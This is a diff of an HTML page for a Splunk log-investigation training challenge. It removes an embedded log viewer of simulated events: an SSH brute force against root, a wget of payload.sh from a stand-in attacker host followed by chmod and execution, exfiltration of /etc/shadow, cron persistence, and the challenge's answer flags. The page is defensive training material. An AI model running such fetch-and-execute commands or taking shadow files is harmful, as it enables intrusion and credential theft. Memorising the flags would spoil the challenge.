@@ -42,16 +42,7 @@
     .challenge-subtitle { font-size: 1rem; color: var(--text-secondary); margin-bottom: 2rem; line-height: 1.7; }
     .challenge-subtitle strong { color: var(--accent); }
 
-    /* Log viewer */
-    .log-viewer { background: #0d1117; border: 1px solid var(--border); border-radius: var(--radius); padding: 1.25rem 1.5rem; margin-bottom: 2.5rem; overflow-x: auto; }
-    .log-viewer h3 { font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.1em; color: var(--accent); margin-bottom: 1rem; font-weight: 600; }
-    .log-viewer pre { font-family: 'Courier New', monospace; font-size: 0.78rem; line-height: 1.8; color: #c9d1d9; white-space: pre; }
-    .log-viewer .log-line { display: block; padding: 2px 0; }
-    .log-viewer .log-line:hover { background: rgba(230, 126, 34, 0.06); }
-    .log-viewer .log-fail { color: #f87171; }
-    .log-viewer .log-accept { color: #4ade80; }
-    .log-viewer .log-cmd { color: #fbbf24; }
-    .log-viewer .log-flag { color: #a78bfa; }
+
 
     .progress-track { width: 100%; height: 6px; background: var(--bg-surface-alt); border-radius: 100px; margin-bottom: 2.5rem; overflow: hidden; }
     .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--accent), #f59e0b); border-radius: 100px; transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1); }
@@ -103,7 +94,7 @@
       .challenge-container { padding: 2rem 1rem 3rem; }
       .answer-row { flex-direction: column; }
       .challenge-header { padding: 1rem; }
-      .log-viewer pre { font-size: 0.68rem; }
+
     }
   </style>
 </head>
@@ -118,26 +109,11 @@
 
     <h1 class="challenge-title">Splunk Log Investigation</h1>
     <p class="challenge-subtitle">
-      Read the <strong>log events</strong> below carefully and answer each question.
-      These are real-world style logs you would see inside a SIEM like Splunk.
-      Some logs contain hidden <strong>flags</strong> — look closely!
+      Use your <strong>Splunk lab</strong> to investigate the ingested logs and answer each question.
+      Search through the events using SPL queries. Some logs contain hidden <strong>flags</strong> — hunt them down!
     </p>
 
-    <!-- Log Viewer -->
-    <div class="log-viewer">
-      <h3>Event Logs — index="main"</h3>
-      <pre><span class="log-line log-fail">May  2 12:00:01 web-server-01 sshd[1234]: Failed password for root from 192.168.1.100 port 54321 ssh2</span>
-<span class="log-line log-fail">May  2 12:00:02 web-server-01 sshd[1235]: Failed password for root from 192.168.1.100 port 54322 ssh2</span>
-<span class="log-line log-fail">May  2 12:00:03 web-server-01 sshd[1236]: Failed password for admin from 192.168.1.100 port 54323 ssh2</span>
-<span class="log-line log-fail">May  2 12:00:04 web-server-01 sshd[1237]: Failed password for root from 192.168.1.100 port 54324 ssh2</span>
-<span class="log-line log-accept">May  2 12:00:05 web-server-01 sshd[1238]: Accepted password for root from 192.168.1.100 port 54325 ssh2</span>
-<span class="log-line log-cmd">May  2 12:05:00 web-server-01 bash: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=wget http://evil-empire.com/payload.sh -O /tmp/payload.sh</span>
-<span class="log-line log-cmd">May  2 12:05:05 web-server-01 bash: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=chmod +x /tmp/payload.sh</span>
-<span class="log-line log-cmd">May  2 12:05:10 web-server-01 bash: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=./tmp/payload.sh</span>
-<span class="log-line log-flag">May  2 12:06:00 web-server-01 payload.sh: [INFO] flag{brut3_f0rc3_succ3ss} — callback established to C2 server</span>
-<span class="log-line log-flag">May  2 12:06:15 web-server-01 payload.sh: [DATA] Exfiltrating /etc/shadow — flag{sh4d0w_st34l}</span>
-<span class="log-line log-flag">May  2 12:06:30 web-server-01 kernel: [ALERT] New crontab entry added by root — persistence installed — flag{p3rs1st3nc3_cr0n}</span></pre>
-    </div>
+
 
     <div class="progress-track">
       <div class="progress-fill" id="progress-fill"></div>
